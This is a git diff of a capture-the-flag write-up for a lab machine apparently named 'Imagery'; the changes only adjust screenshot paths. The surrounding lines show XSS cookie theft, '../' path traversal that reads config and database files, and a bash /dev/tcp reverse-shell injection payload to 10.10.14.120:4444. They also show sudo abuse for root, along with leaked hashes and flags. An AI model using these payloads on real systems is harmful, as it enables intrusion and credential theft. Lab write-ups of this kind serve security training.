@@ -39,7 +39,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 **Analysis:** Target exposes SSH (port 22) and a Flask web application (Werkzeug, port 8000) serving an "Image Gallery".
 
-![nmap scan results](nmap.png)
+![nmap scan results](Imagery/nmap.png)
 
 ### Step 2: Directory Enumeration with Dirsearch
 
@@ -61,7 +61,7 @@ dirsearch -u http://10.10.11.88:8000 -o dirsearch.txt
 
 **Analysis:** Discovered login, register endpoints and protected directories (images, uploads).
 
-![dirsearch results](dirseach.png)
+![dirsearch results](Imagery/dirseach.png)
 
 ### Step 3: Vulnerability Scanning with Nuclei
 
@@ -81,7 +81,7 @@ nuclei -u http://10.10.11.88:8000
 
 **Analysis:** Critical finding - CVE-2023-37582 XSS vulnerability detected.
 
-![nuclei scan results](nuclei.png)
+![nuclei scan results](Imagery/nuclei.png)
 
 ---
 
@@ -110,14 +110,14 @@ python3 -m http.server 9999
 
 **Analysis:** Triggered XSS payload to exfiltrate admin session cookie.
 
-![XSS proof of concept](poc.png)
+![XSS proof of concept](Imagery/poc.png)
 
 **Captured Cookie:**
 ```
 session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94[full session token]
 ```
 
-![Cookie receiver](php_receiver.png)
+![Cookie receiver](Imagery/php_receiver.png)
 
 ### Step 5: Admin Panel Access with Stolen Cookie
 
@@ -128,7 +128,7 @@ session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94[full sessi
 2. Replace session cookie with stolen admin cookie
 3. Access admin-only functionality
 
-![Burp Suite interception](burp.png)
+![Burp Suite interception](Imagery/burp.png)
 
 ### Step 6: Path Traversal / LFI in Log Viewer
 
@@ -140,7 +140,7 @@ GET /admin/get_system_log?log_identifier=../../../../../home/web/web/config.py
 GET /admin/get_system_log?log_identifier=../../../../../home/web/web/db.json
 ```
 
-![Path traversal exploit](burp2.png)
+![Path traversal exploit](Imagery/burp2.png)
 
 **Extracted Credentials:**
 ```json
@@ -151,9 +151,9 @@ GET /admin/get_system_log?log_identifier=../../../../../home/web/web/db.json
 }
 ```
 
-![Database extraction](burp3.png)
+![Database extraction](Imagery/burp3.png)
 
-![Credentials found](db_results.png)
+![Credentials found](Imagery/db_results.png)
 
 ### Step 7: Login as Regular User
 
@@ -162,9 +162,9 @@ GET /admin/get_system_log?log_identifier=../../../../../home/web/web/db.json
 # Login via web interface with extracted credentials
 ```
 
-![User login](login.png)
+![User login](Imagery/login.png)
 
-![Successful authentication](testuserpass.png)
+![Successful authentication](Imagery/testuserpass.png)
 
 ### Step 8: Command Injection via Image Processing
 
@@ -179,7 +179,7 @@ nc -lvnp 4444
 # ";bash -c '/bin/bash -i 5<> /dev/tcp/10.10.14.120/4444 0<&5 1>&5 2>&5' ;"
 ```
 
-![Reverse shell payload](rev_shell.png)
+![Reverse shell payload](Imagery/rev_shell.png)
 
 **Shell Stabilization:**
 ```bash
@@ -189,7 +189,7 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-![Shell obtained](pwn.png)
+![Shell obtained](Imagery/pwn.png)
 
 ### Step 9: User Flag
 
@@ -198,7 +198,7 @@ export TERM=xterm
 cat /home/*/user.txt
 ```
 
-![User flag capture](user_flag.png)
+![User flag capture](Imagery/user_flag.png)
 
 **User Flag:** `5d9c1d507a3f76af1e5c97a3ad1eaa31`
 
@@ -229,7 +229,7 @@ sudo -l
 sudo charcoal -R
 ```
 
-![Password hash discovery](markpass.png)
+![Password hash discovery](Imagery/markpass.png)
 
 **Additional Finding:** Hash discovered for user `supersmash`: `2c65c8d7bfbca32a3ed42596192384f6`
 
@@ -247,7 +247,7 @@ sudo charcoal auto add \
 cat /tmp/pwned.txt
 ```
 
-![Root flag obtained](gettingRootFlag.png)
+![Root flag obtained](Imagery/gettingRootFlag.png)
 
 **Root Flag:** Successfully captured via scheduled task exploitation.
 
